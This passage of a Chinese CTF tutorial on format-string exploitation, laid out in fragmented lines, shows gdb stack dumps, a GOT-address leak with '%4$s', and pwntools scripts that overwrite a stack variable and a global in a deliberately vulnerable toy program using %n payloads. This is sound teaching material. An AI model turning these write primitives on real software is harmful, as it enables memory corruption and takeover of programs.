\n\u2192\n  \n__isoc99_scanf\n+\n0\n \npush\n \nebp\n\n\n0xffbbf8e8\n\u2502\n+\n0x0c\n:\n \n0x000000c2\n\n\n0xffbbf8ec\n\u2502\n+\n0x10\n:\n \n0xf765c6bb\n  \n\u2192\n  \nhandle_intel\n+\n107\n \nadd\n \nesp\n,\n \n0x10\n\n\n0xffbbf8f0\n\u2502\n+\n0x14\n:\n \n0x0804a014\n  \n\u2192\n  \n0xf76280c0\n  \n\u2192\n  \n__isoc99_scanf\n+\n0\n \npush\n \nebp\n  \n\u2190\n \n$\neax\n\n\n0xffbbf8f4\n\u2502\n+\n0x18\n:\n \n%4$s\n\n\n0xffbbf8f8\n\u2502\n+\n0x1c\n:\n \n0x00000000\n\n\n\n\n\n\u540c\u65f6\uff0c\u5728\u6211\u4eec\u8fd0\u884c\u7684terminal\u4e0b\n\n\n\u279c\n  \nleakmemory\n \ngit\n:(\nmaster\n)\n \n\u2717\n \npython\n \nexploit\n.\npy\n\n\n[\n+\n]\n \nStarting\n \nlocal\n \nprocess\n \n./leakmemory\n:\n \npid\n \n65363\n\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n\n    \nArch\n:\n     \ni386\n-\n32\n-\nlittle\n\n    \nRELRO\n:\n    \nPartial\n \nRELRO\n\n    \nStack\n:\n    \nNo\n \ncanary\n \nfound\n\n    \nNX\n:\n       \nNX\n \nenabled\n\n    \nPIE\n:\n      \nNo\n \nPIE\n \n(\n0x8048000\n)\n\n\n0x804a014\n\n\\\nx14\n\\\nxa0\n\\\nx0\n%\n4\n$\ns\n\n\n[\n*\n]\n \nrunning\n \nin\n \nnew\n \nterminal\n:\n \n/\nusr\n/\nbin\n/\ngdb\n \n-\nq\n  \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n \n65363\n\n\n[\n+\n]\n \nWaiting\n \nfor\n \ndebugger\n:\n \nDone\n\n\n0xf76280c0\n\n\n[\n*\n]\n \nSwitching\n \nto\n \ninteractive\n \nmode\n\n\n[\n*\n]\n \nProcess\n \n./leakmemory\n \nstopped\n \nwith\n \nexit\n \ncode\n \n0\n \n(\npid\n \n65363\n)\n\n\n[\n*\n]\n \nGot\n \nEOF\n \nwhile\n \nreading\n \nin\n \ninteractiv\n\n\n\n\n\n\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86scanf\u7684\u5730\u5740\u3002\n\n\n\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u8bf4\u6240\u6709\u7684\u504f\u79fb\u673a\u5668\u5b57\u957f\u7684\u6574\u6570\u500d\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u76f4\u63a5\u76f8\u5e94\u53c2\u6570\u6765\u83b7\u53d6\uff0c\u6709\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145\uff0c\u6765\u4f7f\u5f97\u6211\u4eec\u60f3\u8981\u6253\u5370\u7684\u5730\u5740\u5185\u5bb9\u7684\u5730\u5740\u4f4d\u4e8e\u673a\u5668\u5b57\u957f\u6574\u6570\u500d\u7684\u5730\u5740\u5904\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8fd9\u4e2a\u6837\u5b50\u3002\n\n\n[padding][addr]\n\n\n\n\n\u6ce8\u610f\n\n\n\n\n\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u8f93\u5165\\x0c\\xa0\\x04\\x08%4$s\u8fd9\u662f\u56e0\u4e3a\u867d\u7136\u524d\u9762\u7684\u786e\u5b9e\u662fprintf@got\u7684\u5730\u5740\uff0c\u4f46\u662f\uff0cscanf\u51fd\u6570\u5e76\u4e0d\u4f1a\u5c06\u5176\u8bc6\u522b\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4f1a\u5c06\\,x,0,c\u5206\u522b\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8fdb\u884c\u8bfb\u5165\u3002\u4e0b\u9762\u5c31\u662f\u9519\u8bef\u7684\u4f8b\u5b50\u3002\n\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10   \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  \n\\x0c\\xa0\\x04\\x08%4\n$s\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  \n\\x0c\\xa0\\x04\\x08%4\n$s\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: \n\\x0c\\xa0\\x04\\x08%4\n$s\n   \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: \n\\xa0\\x04\\x08%4\n$s\n\n0xffffcd18\u2502+0x1c: \n\\x04\\x08%4\n$s\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd10 \n\\\\x0c\\\\xa0\\\\x04\\\\x08%4$s\n)\n\n\n[\n#1] 0x80484ce \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  x/x 0xffffcd10\n0xffffcd10:   0x6330785c\n\n\n\n\n\n\n\u8986\u76d6\u5185\u5b58\n\n\n\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u6cc4\u9732\u6808\u5185\u5b58\u4ee5\u53ca\u4efb\u610f\u5730\u5740\u5185\u5b58\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4fee\u6539\u6808\u4e0a\u53d8\u91cf\u7684\u503c\u5462\uff0c\u751a\u81f3\u4fee\u6539\u4efb\u610f\u5730\u5740\u53d8\u91cf\u7684\u5185\u5b58\u5462?\u7b54\u6848\u662f\u53ef\u884c\u7684\uff0c\u53ea\u8981\u53d8\u91cf\u5bf9\u5e94\u7684\u5730\u5740\u53ef\u5199\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u4fee\u6539\u5176\u5bf9\u5e94\u7684\u6570\u503c\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u60f3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u7c7b\u578b\n\n\n%n,\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002\n\n\n\n\n\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u5c0f\u6280\u5de7\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\uff0c\u8fd9\u91cc\u4ecd\u7136\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u4e3a\u8986\u76d6\u6808\u4e0a\u7684\u53d8\u91cf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4e3a\u8986\u76d6\u6307\u5b9a\u5730\u5740\u7684\u53d8\u91cf\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\u3002\n\n\n/* example/overflow/overflow.c */\n\n\n#include\n \nstdio.h\n\n\nint\n \na\n \n=\n \n123\n,\n \nb\n \n=\n \n456\n;\n\n\nint\n \nmain\n()\n \n{\n\n  \nint\n \nc\n \n=\n \n789\n;\n\n  \nchar\n \ns\n[\n100\n];\n\n  \nprintf\n(\n%p\n\\n\n,\n \nc\n);\n\n  \nscanf\n(\n%s\n,\n \ns\n);\n\n  \nprintf\n(\ns\n);\n\n  \nif\n \n(\nc\n \n==\n \n16\n)\n \n{\n\n    \nputs\n(\nmodified c.\n);\n\n  \n}\n \nelse\n \nif\n \n(\na\n \n==\n \n2\n)\n \n{\n\n    \nputs\n(\nmodified a for a small number.\n);\n\n  \n}\n \nelse\n \nif\n \n(\nb\n \n==\n \n0x12345678\n)\n \n{\n\n    \nputs\n(\nmodified b for a big number!\n);\n\n  \n}\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\nmakefile\u5728\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u800c\u65e0\u8bba\u662f\u8986\u76d6\u54ea\u4e2a\u5730\u5740\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u57fa\u672c\u4e0a\u90fd\u662f\u6784\u9020\u7c7b\u4f3c\u5982\u4e0b\u7684payload\n\n\n...[overwrite addr]....%[overwrite offset]$n\n\n\n\n\n\u5176\u4e2d...\u8868\u793a\u6211\u4eec\u7684\u586b\u5145\u5185\u5bb9\uff0coverwrite addr \u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\uff0coverwrite offset\u5730\u5740\u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e3a\u8f93\u51fa\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\uff0c\u4e5f\u662f\u5982\u4e0b\u6b65\u9aa4\n\n\n\n\n\u786e\u5b9a\u8986\u76d6\u5730\u5740\n\n\n\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb\n\n\n\u8fdb\u884c\u8986\u76d6\n\n\n\n\n\u8986\u76d6\u6808\u5185\u5b58\n\n\n\u786e\u5b9a\u8986\u76d6\u5730\u5740\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u81ea\u7136\u662f\u6765\u60f3\u529e\u6cd5\u77e5\u9053\u6808\u53d8\u91cfc\u7684\u5730\u5740\u3002\u7531\u4e8e\u76ee\u524d\u51e0\u4e4e\u4e0a\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u5f00\u542f\u4e86aslr\u4fdd\u62a4\uff0c\u6240\u4ee5\u6808\u7684\u5730\u5740\u4e00\u76f4\u5728\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u6545\u610f\u8f93\u51fa\u4e86c\u53d8\u91cf\u7684\u5730\u5740\u3002\n\n\n\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb\n\n\n\u5176\u6b21\uff0c\u6211\u4eec\u6765\u786e\u5b9a\u4e00\u4e0b\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u662fprintf\u5c06\u8981\u8f93\u51fa\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570()\u3002 \u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u4e4b\u524d\u7684\u6cc4\u9732\u6808\u53d8\u91cf\u6570\u503c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u64cd\u4f5c\u3002\u901a\u8fc7\u8c03\u8bd5\n\n\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffcd0c\n, \nl8\n]\n\n\n8\n\n0xffffcd0c\u2502+0x00: 0x080484d7  \u2192  \nmain+76\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd10\u2502+0x04: 0xffffcd28  \u2192  \n%d%d\n\n0xffffcd14\u2502+0x08: 0xffffcd8c  \u2192  0x00000315\n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd20\u2502+0x14: 0xffffcd4e  \u2192  0xffff0000  \u2192  0x00000000\n0xffffcd24\u2502+0x18: 0xffffce4c  \u2192  0xffffd07a  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n0xffffcd28\u2502+0x1c: \n%d%d\n     \u2190 \n$eax\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u57280xffffcd28\u5904\u5b58\u50a8\u7740\u53d8\u91cfc\u7684\u6570\u503c\u3002\u7ee7\u800c\uff0c\u6211\u4eec\u518d\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32'%d%d'\u7684\u5730\u57400xffffcd28\u76f8\u5bf9\u4e8eprintf\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u65700xffffcd10\u7684\u504f\u79fb\u4e3a0x18\uff0c\u5373\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5f53\u4e8eprintf\u51fd\u6570\u7684\u7b2c7\u4e2a\u53c2\u6570\uff0c\u76f8\u5f53\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c6\u4e2a\u53c2\u6570\u3002\n\n\n\u8fdb\u884c\u8986\u76d6\n\n\n\u8fd9\u6837\uff0c\u7b2c6\u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cfc\u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528%n\u7684\u7279\u5f81\u6765\u4fee\u6539c\u7684\u503c\u3002payload\u5982\u4e0b\n\n\n[addr of c]%012d%6$n\n\n\n\n\naddr of c \u7684\u957f\u5ea6\u4e3a4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u516512\u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u523016\u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539c\u7684\u503c\u4e3a16\u3002\n\n\n\u5177\u4f53\u811a\u672c\u5982\u4e0b\n\n\ndef\n \nforc\n():\n\n    \nsh\n \n=\n \nprocess\n(\n./overwrite\n)\n\n    \nc_addr\n \n=\n \nint\n(\nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n),\n \n16\n)\n\n    \nprint\n \nhex\n(\nc_addr\n)\n\n    \npayload\n \n=\n \np32\n(\nc_addr\n)\n \n+\n \n%012d\n \n+\n \n%6$n\n\n    \nprint\n \npayload\n\n    \n#gdb.attach(sh)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \nprint\n \nsh\n.\nrecv\n()\n\n    \nsh\n.\ninteractive\n()\n\n\n\nforc\n()\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  overwrite git:\n(\nmaster\n)\n \u2717 python exploit.py\n\n[\n+\n]\n Starting \nlocal\n process \n./overwrite\n: pid \n74806\n\n0xfffd8cdc\n\u070c\ufffd\ufffd%012d%6\n$n\n\n\u070c\ufffd\ufffd-00000160648modified c.\n\n\n\n\n\u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58\n\n\n\u8986\u76d6\u5c0f\u6570\u5b57\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u8003\u8651\u4e00\u4e0b\u5982\u4f55\u4fee\u6539data\u6bb5\u7684\u53d8\u91cf\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4\uff0c\n\u5c0f\u4e8e\u673a\u5668\u5b57\u957f\u7684\u6570\u5b57\n\u3002\u8fd9\u91cc\u4ee52\u4e3a\u4f8b\u3002\u53ef\u80fd\u4f1a\u89c9\u5f97\u8fd9\u5176\u5b9e\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ef\u4ed4\u7ec6\u4e00\u60f3\uff0c\u771f\u7684\u6ca1\u6709\u4e48\uff1f\u5982\u679c\u6211\u4eec\u8fd8\u662f\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u90a3\u4e48\u5c06\u76f4\u63a5\u5360\u7528\u673a\u5668\u5b57\u957f\u4e2a(4\u62168)\u5b57\u8282\u3002\u663e\u7136\uff0c\u65e0\u8bba\u4e4b\u540e\u5982\u4f55\u8f93\u51fa\uff0c\u90fd\u53ea\u4f1a\u6bd44\u5927\u3002\n\n\n\n\n\u6216\u8bb8\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6574\u5f62\u6ea2\u51fa\u6765\u4fee\u6539\u5bf9\u5e94\u7684\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u6837\u5c06\u9762\u4e34\u7740\u6211\u4eec\u5f97\u4e00\u6b21\u8f93\u51fa\u5927\u91cf\u7684\u5185\u5bb9\u3002\u800c\u8fd9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u57fa\u672c\u90fd\u4e0d\u4f1a\u653b\u51fb\u6210\u529f\u3002\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u505a\u5462\uff1f\u518d\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5c06\u6240\u8981\u8986\u76d6\u7684\u53d8\u91cf\u7684\u5730\u5740\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\u4e48\uff1f\u4f3c\u4e4e\u6ca1\u6709\uff0c\u6211\u4eec\u5f53\u65f6\u53ea\u662f\u4e3a\u4e86\u5bfb\u627e\u504f\u79fb\uff0c\u6240\u4ee5\u624d\u628atag\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\uff0c\u5982\u679c\u6211\u4eec\u628atag\u653e\u5728\u4e2d\u95f4\uff0c\u5176\u5b9e\u4e5f\u662f\u65e0\u59a8\u7684\u3002\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u628a\u5730\u5740\u653e\u5728\u4e2d\u95f4\uff0c\u53ea\u8981\u80fd\u591f\u627e\u5230\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u5176\u7167\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u6570\u503c\u3002\u524d\u9762\u5df2\u7ecf\u8bf4\u4e86\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4e3a\u7b2c6\u4e2a\u53c2\u6570\u3002\u7531\u4e8e\u6211\u4eec\u60f3\u8981\u628a2\u5199\u5230\u5bf9\u5e94\u7684\u5730\u5740\u5904\uff0c\u6545\u800c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u524d\u9762\u7684\u5b57\u8282\u5fc5\u987b\u662f\n\n\naa%k$nxx\n\n\n\n\n\u6b64\u65f6\u5bf9\u5e94\u7684\u5b58\u50a8\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5df2\u7ecf\u5360\u636e\u4e866\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6211\u4eec\u518d\u6dfb\u52a0\u4e24\u4e2a\u5b57\u7b26aa\uff0c\u90a3\u4e48\u5176\u5b9eaa%k\u5c31\u662f\u7b2c6\u4e2a\u53c2\u6570\uff0c$nxx\u5176\u5b9e\u5c31\u662f\u7b2c7\u4e2a\u53c2\u6570\uff0c\u540e\u9762\u6211\u4eec\u5982\u679c\u8ddf\u4e0a\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740\uff0c\u90a3\u5c31\u662f\u7b2c8\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u8fd9\u91cc\u8bbe\u7f6ek\u4e3a8\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u8986\u76d6\u4e86\u3002\n\n\n\u5229\u7528ida\u53ef\u4ee5\u5f97\u5230a\u7684\u5730\u5740\u4e3a0x0804A024\uff08\u7531\u4e8ea\u3001b\u662f\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u4e0d\u5728\u5806\u6808\u4e2d\uff09\u3002\n\n\n.data:\n0804\nA024\n                 \npublic\n \na\n\n\n.data:\n0804\nA024\n \na\n               \ndd\n \n7\nBh\n\n\n\n\n\n\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5229\u7528\u4ee3\u7801\n\n\ndef\n \nfora\n():\n\n    \nsh\n \n=\n \nprocess\n(\n./overwrite\n)\n\n    \na_addr\n \n=\n \n0x0804A024\n\n    \npayload\n \n=\n \naa%8$naa\n \n+\n \np32\n(\na_addr\n)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \nprint\n \nsh\n.\nrecv\n()\n\n    \nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  overwrite git:\n(\nmaster\n)\n \u2717 python exploit.py\n\n[\n+\n]\n Starting \nlocal\n process \n./overwrite\n: pid \n76508\n\n\n[\n*\n]\n Process \n./overwrite\n stopped with \nexit\n code \n0\n \n(\npid \n76508\n)\n\n0xffc1729c\naaaa$\n\\x\na0\n\\x\n0modified a \nfor\n a small number.\n\n\n\n\n\u5176\u5b9e\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u638c\u63e1\u7684\u5c0f\u6280\u5de7\u5c31\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u5fc5\u8981\u5fc5\u987b\u628a\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u653e\u5728\u90a3\u91cc\u90fd\u53ef\u4ee5\uff0c\u53ea\u8981\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5176\u5bf9\u5e94\u7684\u504f\u79fb\u5373\u53ef\u3002\n\n\n\u8986\u76d6\u5927\u6570\u5b57\n\n\n\u4e0a\u9762\u4ecb\u7ecd\u4e86\u8986\u76d6\u5c0f\u6570\u5b57\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u5c11\u8986\u76d6\u5927\u6570\u5b57\u4e86\u3002\u4e0a\u9762\u6211\u4eec\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u4e00\u6b21\u6027\u8f93\u51fa\u5927\u6570\u5b57\u4e2a\u5b57\u8282\u6765\u8fdb\u884c\u8986\u76d6\uff0c\u4f46\u662f\u8fd9\u6837\u57fa\u672c\u4e5f\u4e0d\u4f1a\u6210\u529f\uff0c\u56e0\u4e3a\u592a\u957f\u4e86\u3002\u800c\u4e14\u5373\u4f7f\u6210\u529f\uff0c\u6211\u4eec\u4e00\u6b21\u6027\u7b49\u5f85\u7684\u65f6\u95f4\u4e5f\u592a\u957f\u4e86\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5462\uff1f\u81ea\u7136\u662f\u6709\u4e86\u3002\n\n\n\u4e0d\u8fc7\u5728\u4ecb\u7ecd\u4e4b\u524d\uff0c\u6211\u4eec\u5f97\u5148\u518d\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\uff0c\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u683c\u5f0f\u3002\u9996\u5148\uff0c\u6240\u6709\u7684\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u90fd\u662f\u4ee5\u5b57\u8282\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6b64\u5916\uff0c\u5728x86\u548cx64\u7684\u4f53\u7cfb\u7ed3\u6784\u4e2d\uff0c\u53d8\u91cf\u7684\u5b58\u50a8\u683c\u5f0f\u4e3a\u4ee5\u5c0f\u7aef\u5b58\u50a8\uff0c\u5373\u6700\u4f4e\u6709\u6548\u4f4d\u5b58\u50a8\u5728\u4f4e\u5730\u5740\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c0x12345678\u5728\u5185\u5b58\u4e2d\u7531\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u4e3a\\x78\\x56\\x34\\x12\u3002\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u56de\u5fc6\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6807\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u8fd9\u4e48\u4e24\u4e2a\u6807\u5fd7\uff1a\n\n\nhh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4ecechar\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002\nh  \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4eceshort\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002\n\n\n\n\n\u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528%hhn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u5355\u5b57\u8282\uff0c\u5229\u7528%hn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u53cc\u5b57\u8282\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5\u5355\u5b57\u8282\u4e3a\u4f8b\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u786e\u5b9a\u7684\u662f\u8981\u8986\u76d6\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u5229\u7528ida\u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u4e3a0x0804A028\u3002\n\